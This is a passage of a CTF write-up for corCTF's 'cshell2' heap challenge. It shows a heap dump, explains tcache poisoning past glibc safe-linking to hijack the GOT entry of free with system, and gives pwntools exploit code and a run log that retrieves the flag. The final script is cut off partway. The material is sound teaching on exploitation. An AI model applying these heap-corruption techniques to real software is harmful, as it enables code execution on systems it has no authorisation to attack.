<span class="s2">&#34;&#34;&#34;
</span><span class="s2">0x13f6310	0x0000000000000000	0x0000000000000411	................ [chunk8]
</span><span class="s2">0x13f6320	0x00000000013f4c0a	0x000000000000000a	.L?.............
</span><span class="s2">0x13f6330	0x000000000000000a	0x0000000000000539	........9.......
</span><span class="s2">0x13f6340	0x0000000000000000	0x0000000000000000	................
</span><span class="s2">0x13f6350	0x0000000000000000	0x0000000000000000	................
</span><span class="s2">0x13f6360	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX [chun8-&gt;bio]
</span><span class="s2">0x13f6370	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f6380	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f6390	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f63a0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f63b0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f63c0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f63d0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f63e0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f63f0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f6400	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f6410	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f6420	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f6430	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f6440	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f6450	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f6460	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f6470	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f6480	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f6490	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f64a0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f64b0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f64c0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f64d0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f64e0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f64f0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f6500	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f6510	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f6520	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f6530	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f6540	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f6550	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f6560	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f6570	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f6580	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f6590	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f65a0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f65b0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f65c0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f65d0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f65e0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f65f0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f6600	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f6610	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f6620	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f6630	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f6640	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f6650	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f6660	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f6670	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f6680	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f6690	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f66a0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f66b0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f66c0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f66d0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f66e0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f66f0	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f6700	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f6710	0x5858585858585858	0x5858585858585858	XXXXXXXXXXXXXXXX
</span><span class="s2">0x13f6720	0x5858585858585858	0x0a58585858585858	XXXXXXXXXXXXXXX.
</span><span class="s2">0x13f6730	0x00000000013f4ce6	0xdc8340f7dfc0b0e1	.L?..........@..	 &lt;-- tcachebins[0x410][0/7] [chunk9]
</span><span class="s2">&#34;&#34;&#34;</span>

</code></pre></div><p>Then here we are, we leaked both libc and heap base addresses. We just have to to tcache poisoning on <code>free</code>.</p>
<div class="gblog-post__anchorwrap">
    <h2 id="tcache-poisoning--profit">
        Tcache poisoning + PROFIT
        <a data-clipboard-text="https://nasm.re/posts/cshell2/#tcache-poisoning--profit" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Tcache poisoning &#43; PROFIT" href="#tcache-poisoning--profit">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>We overflow the <code>8</code>-th chunk to overwrite the next freepointer of <code>chunk9</code> that is stored at the HEAD of the <code>0x410</code> tcachebin. Then we got an arbitrary write.
We craft a nice header to be able to request it back from the tcache, and we encrypt the <code>next</code> with the location of the <code>chunk9</code> to pass safe-linking checks.</p>
<p>Given we hiijack GOT we initialized properly some pointers around to avoid segfaults. We do not get a write into the GOT entry of <code>free</code> cause it is unaliagned and <code>malloc</code> needs <code>16</code> bytes aligned next free pointer.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="n">edit</span><span class="p">(</span><span class="mi">11</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="mi">1337</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;X&#34;</span><span class="o">*</span><span class="p">(</span><span class="mi">1032</span> <span class="o">-</span> <span class="mi">64</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x411</span><span class="p">)</span> <span class="o">+</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(((</span><span class="n">heap</span> <span class="o">+</span> <span class="mh">0x2730</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">exe</span><span class="o">.</span><span class="n">got</span><span class="o">.</span><span class="n">free</span> <span class="o">-</span> <span class="mh">0x8</span><span class="p">)))</span>

<span class="c1"># dumb</span>
<span class="n">add</span><span class="p">(</span><span class="mi">12</span><span class="p">,</span> <span class="mi">1032</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="mi">1337</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="p">)</span>

<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;5 re-age user</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;1&#34;</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;index: </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">13</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Enter size (1032 minimum): </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">1032</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Input firstname: </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0xbbdf80</span><span class="p">))</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Input middlename: </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">system</span><span class="p">))</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Input lastname: </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x71ab0</span><span class="p">))</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Input age: </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Input bio: </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">pwn</span><span class="o">.</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0x4cb40</span><span class="p">))</span>

<span class="c1"># Finally</span>

<span class="n">delete</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;cat flag.txt&#34;</span><span class="p">)</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;flag: </span><span class="si">{</span><span class="n">io</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>

<span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div><p>Here we are:</p>
<pre tabindex="0"><code>nasm@off:~/Documents/pwn/corCTF/cshell2$ python3 exploit.py REMOTE HOST=be.ax PORT=31667
[*] '/home/nasm/Documents/pwn/corCTF/cshell2/cshell2'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x3fb000)
    RUNPATH:  b'.'
[*] '/home/nasm/Documents/pwn/corCTF/cshell2/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to be.ax on port 31667: Done
[*] libc: 0x7f1d388db000
[*] heap: 0x665000
[*] flag: b'corctf{m0nk3y1ng_0n_4_d3bugg3r_15_th3_b35T!!!}\n'
[*] Switching to interactive mode
$
</code></pre><div class="gblog-post__anchorwrap">
    <h2 id="appendices">
        Appendices
        <a data-clipboard-text="https://nasm.re/posts/cshell2/#appendices" class="gblog-post__anchor gblog-post__anchor--right clip" aria-label="Anchor Appendices" href="#appendices">
            <svg class="icon gblog_link"><use xlink:href="#gblog_link"></use></svg>
        </a>
    </h2>
</div>
<p>Final exploit:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="ch">#!/usr/bin/env python</span>
<span class="c1"># -*- coding: utf-8 -*-</span>

<span class="c1"># this exploit was generated via</span>
<span class="c1"># 1) pwntools</span>
<span class="c1"># 2) ctfmate</span>

<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">time</span>
<span class="kn">import</span> <span class="nn">pwn</span>


<span class="c1"># Set up pwntools for the correct architecture</span>
<span class="n">exe</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;cshell2&#39;</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">ELF</span><span class="p">(</span><span class="s2">&#34;./libc.so.6&#34;</span><span class="p">)</span>

<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">delete_corefiles</span> <span class="o">=</span> <span class="kc">True</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">rename_corefiles</span> <span class="o">=</span> <span class="kc">False</span>
<span class="n">pwn</span><span class="o">.</span><span class="n">context</span><span class="o">.</span><span class="n">timeout</span> <span class="o">=</span> <span class="mi">2000</span>

<span class="n">host</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">HOST</span> <span class="ow">or</span> <span class="s1">&#39;127.0.0.1&#39;</span>
<span class="n">port</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">PORT</span> <span class="ow">or</span> <span class="mi">1337</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">local</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="s1">&#39;&#39;&#39;Execute the target binary locally&#39;&#39;&#39;</span>
    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">pwn</span><span class="o">.</span><span class="n">gdb</span><span class="o">.</span><span class="n">debug</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">pwn</span><span class="o">.</span><span class="n">process</span><span class="p">([</span><span class="n">exe</span><span class="o">.</span><span class="n">path</span><span class="p">]</span> <span class="o">+</span> <span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">remote</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="s1">&#39;&#39;&#39;Connect to the process on the remote host&#39;&#39;&#39;</span>
    <span class="n">io</span> <span class="o">=</span> <span class="n">pwn</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">GDB</span><span class="p">:</span>
        <span class="n">pwn</span><span class="o">.</span><span class="n">gdb</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">io</span><span class="p">,</span> <span class="n">gdbscript</span><span class="o">=</span><span class="n">gdbscript</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">io</span>


<span class="k">def</span> <span class="nf">start</span><span class="p">(</span><span class="n">argv</span><span class="o">=</span><span class="p">[],</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">):</span>
    <span class="s1">&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;</span>
    <span class="k">if</span> <span class="n">pwn</span><span class="o">.</span><span class="n">args</span><span class="o">.</span><span class="n">LOCAL</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">local</span><span class="p">(</span><span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">remote</span><span class="p">(</span><span class="n">argv</span><span class="p">,</span> <span class="o">*</span><span class="n">a</span><span class="p">,</span> <span class="o">**</span><span class="n">kw</span><span class="p">)</span>


<span class="n">gdbscript</span> <span class="o">=</span> <span class="s1">&#39;&#39;&#39;
</span><span class="s1">continue
</span><span class="s1">&#39;&#39;&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="o">**</span><span class="nb">locals</span><span class="p">())</span>

<span class="n">io</span> <span class="o">=</span> <span class="kc">None</span>


<span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>

<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">firstname</span><span class="p">,</span> <span class="n">midname</span><span class="p">,</span> <span class="n">lastname</span><span class="p">,</span> <span class="n">age</span><span class="p">,</span> <span class="n">bio</span><span class="p">,</span> <span class="n">l</span><span class="o">=</span><span class="kc">True</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;5 re-age user</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;1&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;index: </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Enter size (1032 minimum): </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="k">if</span> <span class="n">l</span><span class="p">:</span>
        <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Input firstname: </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">firstname</span><span class="p">)</span>
        <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Input middlename: </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">midname</span><span class="p">)</span>
        <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Input lastname: </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">lastname</span><span class="p">)</span>
        <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Input age: </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">age</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
        <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Input bio: </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">bio</span><span class="p">)</span>

    <span class="k">else</span><span class="p">:</span>
        <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Input firstname: </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">firstname</span><span class="p">)</span>
        <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Input middlename: </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">midname</span><span class="p">)</span>
        <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Input lastname: </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">lastname</span><span class="p">)</span>
        <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Input age: </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">age</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
        <span class="n">io</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Input bio: </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">bio</span><span class="p">)</span>



<span class="k">def</span> <span class="nf">show</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;5 re-age user</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;2&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;index: &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>

<span class="k">def</span> <span class="nf">delete</span><span class="p">(</span><span class="n">idx</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;5 re-age user</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;3&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;index: &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>

<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span> <span class="n">firstname</span><span class="p">,</span> <span class="n">midname</span><span class="p">,</span> <span class="n">lastname</span><span class="p">,</span> <span class="n">age</span><span class="p">,</span> <span class="n">bio</span><span class="p">):</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;5 re-age user</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;4&#34;</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;index: &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">idx</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
    
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Input firstname: </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">firstname</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Input middlename: </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">midname</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Input lastname: </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">lastname</span><span class="p">)</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;Input age: </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">age</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
    <span class="n">io</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;)</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">bio</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">decrypt_pointer</span><span class="p">(</span><span class="n">leak</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">int</span><span class="p">:</span>
    <span class="n">parts</span> <span class="o">=</span> <span class="p">[]</span>

    <span class="n">parts</span><span class="o">.</span><span class="n">append</span><span class="p">((</span><span class="n">leak</span> <span class="o">&gt;&gt;</span> <span class="mi">36</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">36</span><span class="p">)</span>
    <span class="n">parts</span><span class="o">.</span><span class="n">append</span><span class="p">((((</span><span class="n">leak</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFF</span><span class="p">)</span> <span class="o">^</span> <span class="p">(</span><span class="n">parts</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">36</span><span class="p">))</span> <span class="o">&lt;&lt;</span> <span class="mi">24</span><span class="p">)</span>
    <span class="n">parts</span><span class="o">.</span><span class="n">append</span><span class="p">((((</span><span class="n">leak</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFF</span><span class="p">)</span> <span class="o">^</span> <span class="p">((</span><span class="n">parts</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xFFF</span><span class="p">))</span> <span class="o">&lt;&lt;</span> <span class="mi">12</span><span class="p">)</span>

    <span class="k">return</span> <span class="n">parts</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">|</span> <span class="n">parts</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">|</span> <span class="n">parts</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>

